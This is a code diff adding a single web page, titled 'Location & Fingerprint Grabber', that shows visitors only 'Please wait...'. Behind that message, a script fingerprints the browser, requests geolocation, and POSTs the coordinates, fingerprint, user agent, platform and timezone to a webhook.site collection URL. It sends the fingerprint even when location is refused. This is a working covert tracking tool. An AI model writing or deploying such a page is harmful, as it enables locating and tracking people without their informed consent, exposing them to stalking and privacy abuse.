@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location & Fingerprint Grabber</title>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+</head>
+<body>
+  <h1>Please wait...</h1>
+
+  <script>
+    const fpPromise = FingerprintJS.load();
+
+    function sendData(locationData, fingerprintData) {
+      const formData = new FormData();
+      formData.append("latitude", locationData.latitude);
+      formData.append("longitude", locationData.longitude);
+      formData.append("accuracy", locationData.accuracy);
+      formData.append("fingerprint", fingerprintData.visitorId);
+      formData.append("userAgent", navigator.userAgent);
+      formData.append("platform", navigator.platform);
+      formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+      fetch("https://webhook.site/b1218c8c-c615-4d0d-8173-5db4f8f397c0", {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    fpPromise.then(fp => {
+      fp.get().then(result => {
+        const fingerprintData = result;
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const locationData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            };
+
+            console.log("Got location:", locationData);
+            sendData(locationData, fingerprintData);
+
+          }, function(error) {
+            console.error("Error occurred:", error);
+            sendData({
+              latitude: null,
+              longitude: null,
+              accuracy: null
+            }, fingerprintData);
+          });
+
+        } else {
+          alert("Geolocation is not supported.");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
